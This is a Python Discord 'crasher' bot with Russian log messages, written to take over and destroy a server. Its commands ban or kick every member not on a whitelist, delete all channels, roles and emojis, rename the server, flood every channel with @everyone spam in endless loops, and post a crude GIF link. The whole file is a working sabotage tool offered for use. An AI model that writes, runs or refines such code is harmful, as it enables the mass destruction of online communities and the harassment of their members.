from os import system, name

import configparser
import discord
import json
import random
import string
import sys
from colorama import Fore, init
from discord import member
from discord.ext import commands

init()

config = configparser.ConfigParser()
config.read('config.ini')

Token = config.get("Crasher", "Token")
whit = json.loads(config.get("Crasher", "Whitelist"))

if name == "nt":
    _ = system("cls")

else:
    _ = system("clear")

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='$', intents=intents)


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.offline, activity=discord.Game(''))
    print(f"""{Fore.LIGHTRED_EX}
    
    
    
███╗░░░███╗░█████╗░██╗░░██╗░██████╗░█████╗░███╗░░██╗
████╗░████║██╔══██╗██║░██╔╝██╔════╝██╔══██╗████╗░██║
██╔████╔██║███████║█████═╝░╚█████╗░██║░░██║██╔██╗██║
██║╚██╔╝██║██╔══██║██╔═██╗░░╚═══██╗██║░░██║██║╚████║
██║░╚═╝░██║██║░░██║██║░╚██╗██████╔╝╚█████╔╝██║░╚███║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░╚═╝░░╚══╝
{Fore.RED} Полный АД начинается ;)""")


@client.command()
async def crash(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Выполняю краш")
    global channel
    author = ctx.message.author
    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
    ban = 0
    bany = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                ban += 1
                await member.ban()
                bany += 1
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
                continue

        elif member.id in whit:
            ban += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1

    print(
        f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
            continue

    for b in range(1):
        await ctx.guild.create_text_channel("чат")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")

    await ctx.guild.edit(name="Тестим дичь")
    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")

    while True:
        for channel in ctx.guild.text_channels:
            await channel.send("Сервер Умер @everyone")

    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            try:
                await role.delete()
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
                continue
        else:
            break

    string.ascii_letters + string.digits

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")

    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")

@client.command()
async def clear(ctx, amount=100000):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Удалил чат")
    await ctx.channel.purge(limit=amount) #CLEAR

@client.command()
async def kickall(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Выполняю кик")
    ctx.message.author
    kick = 0
    kicky = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                kick += 1
                await member.kick()
                kicky += 1
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не кикнул:{Fore.WHITE}: {member}")
                continue
        elif member.id in whit:
            kick += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1

    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {kick} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а кикнул{Fore.WHITE}: {kicky} {Fore.RED} человек {Fore.WHITE}.")

@client.command()
async def banall(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Выполняю бан")
    ctx.message.author
    ban = 0
    bany = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                ban += 1
                await member.ban()
                bany += 1
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не забанил:{Fore.WHITE}: {member}")
                continue
        elif member.id in whit:
            ban += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1

    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")


@client.command()
async def delete(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Удалил все каналы")
    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    for channel in range(1):
        await ctx.guild.create_text_channel("чат")

@client.command()
async def luc(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Спам активирован")
    while True:
        for channel in ctx.guild.text_channels:
            await channel.send("Люцифер ТОП")

@client.command()
async def check(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Отправил чек")
    for ctx in ctx.guild.text_channels:
        await ctx.send("+")

@client.command()
async def ass(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] {Fore.LIGHTBLUE_EX}Отправил GIF")
    for ctx in ctx.guild.text_channels:
        await ctx.send("https://tenor.com/view/ass-jeans-grope-grab-booty-gif-15058415")


try:
    client.run(Token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
